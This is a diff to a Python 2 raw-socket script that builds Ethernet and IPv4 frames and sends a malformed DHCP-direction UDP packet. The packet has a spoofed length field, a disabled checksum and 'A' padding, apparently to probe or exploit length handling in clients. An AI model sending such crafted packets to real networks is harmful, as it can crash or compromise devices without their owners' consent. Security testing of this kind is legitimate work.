@@ -16,8 +16,7 @@ def sendeth(src, dst, eth_type, payload, iface):
     s = socket(AF_PACKET, SOCK_RAW) 
     s.bind((iface, 0))
 
-    print hexlify(dst + src + eth_type)
-    print hexlify(payload)
+    print 'ether frame: %s' % hexlify(dst + src + eth_type)
 
     return s.send(dst + src + eth_type + payload)
 
@@ -27,6 +26,8 @@ def pack(buf):
 def sendipv4(eth_src, eth_dst, eth_type, ip_src, ip_dst, ip_type, payload, iface):
     # Asserts
     assert(len(ip_src) == len(ip_dst) == 4)
+
+    print 'ipv4 payload: %s' % hexlify(payload)
     
     frame = b''
 
@@ -62,6 +63,8 @@ def sendipv4(eth_src, eth_dst, eth_type, ip_src, ip_dst, ip_type, payload, iface
     # Destination
     frame += ip_dst
 
+    print 'ipv4 frame: %s' % hexlify(frame)
+
     # Data
     frame += payload
 
@@ -83,7 +86,7 @@ iface = 'wlan1'
 payload = b''
 payload += pack([0x00, 67]) # SRC PORT
 payload += pack([0x00, 68]) # DST PORT
-payload += pack([0xff, 0xff]) # LENGTH (spoofed
+payload += pack([0x00, 0x01]) # LENGTH (spoofed
 payload += pack([0x00, 0x00]) # Checksum (disabled)
 payload += 'A'*236
 
